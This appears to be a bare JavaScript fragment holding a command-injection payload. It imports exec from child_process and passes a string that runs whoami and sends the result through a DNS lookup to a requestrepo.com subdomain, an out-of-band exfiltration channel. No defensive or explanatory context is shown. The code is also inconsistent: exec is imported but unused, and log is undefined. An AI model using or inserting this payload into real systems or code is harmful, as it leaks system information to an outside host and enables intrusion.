const {exec} = require("child_process");
log("user=$(whoami) && host $user.test.requestrepo.com", () => {});
